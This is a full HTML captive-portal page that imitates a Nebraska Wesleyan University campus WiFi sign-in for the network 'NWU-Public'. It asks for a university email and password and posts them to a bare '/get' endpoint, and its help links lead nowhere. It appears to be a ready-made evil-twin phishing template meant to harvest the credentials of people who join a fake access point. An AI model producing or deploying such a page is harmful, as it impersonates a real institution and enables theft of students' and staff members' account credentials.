<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#f0ece4}
.top{width:100%;max-width:420px;background:#0a0a0a;border:1px solid #2c2c2c;border-bottom:2px solid #C4A050;border-radius:14px 14px 0 0;padding:20px 24px 18px}
.uni{font-size:13px;font-weight:800;letter-spacing:1.8px;text-transform:uppercase;color:#C4A050}
.sub{font-size:11px;letter-spacing:0.6px;color:#7a7568;margin-top:3px;text-transform:uppercase}
.card{background:#141414;width:100%;max-width:420px;border:1px solid #2c2c2c;border-top:none;border-radius:0 0 14px 14px;overflow:hidden}
.cb{padding:26px 24px 22px}
.badge{display:flex;align-items:center;gap:10px;background:#1a1a1a;border:1px solid #2c2c2c;border-radius:8px;padding:10px 13px;margin-bottom:22px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.18)}
.badge span{font-size:12.5px;color:#7a7568}.badge strong{color:#f0ece4;font-weight:600}
h2{font-size:20px;font-weight:800;letter-spacing:1.6px;text-transform:uppercase;color:#C4A050;margin-bottom:4px}
.subh{font-size:12.5px;color:#7a7568;margin-bottom:22px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#7a7568;margin-bottom:7px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1px solid #2c2c2c;border-radius:8px;font-size:15px;background:#1e1e1e;color:#f0ece4}
input:focus{outline:none;border-color:#8B7040;box-shadow:0 0 0 3px rgba(196,160,80,0.12)}
input::placeholder{color:#3d3d3d}
.forgot{display:block;text-align:right;font-size:12px;color:#8B7040;text-decoration:none;margin-top:8px;margin-bottom:20px}
.btn{width:100%;padding:13px;border:none;border-radius:8px;background:#C4A050;color:#000;font-size:13px;font-weight:800;letter-spacing:1.6px;text-transform:uppercase;cursor:pointer;margin-top:6px}
.foot{background:#0f0f0f;border-top:1px solid #2c2c2c;padding:12px 24px;display:flex;justify-content:space-between;align-items:center}
.foot span{font-size:11px;color:#7a7568}.foot a{color:#8B7040;text-decoration:none;font-size:11px}
</style>
</head>
<body>
<div class="top"><div class="uni">Nebraska Wesleyan University</div><div class="sub">Campus Network Portal</div></div>
<div class="card">
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>NWU-Public</strong></span></div>
    <h2>Network Sign In</h2>
    <p class="subh">Enter your NWU credentials to connect to campus WiFi.</p>
    <form action="/get">
      <label class="lbl">NWU Email</label>
      <input name="email" type="text" placeholder="netid@nebrwesleyan.edu" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <a href="#" class="forgot">Forgot password?</a>
      <button type="submit" class="btn">Connect to Network</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Nebraska Wesleyan University IT</span><a href="#">IT Help Desk</a></div>
</div>
</body>
</html>
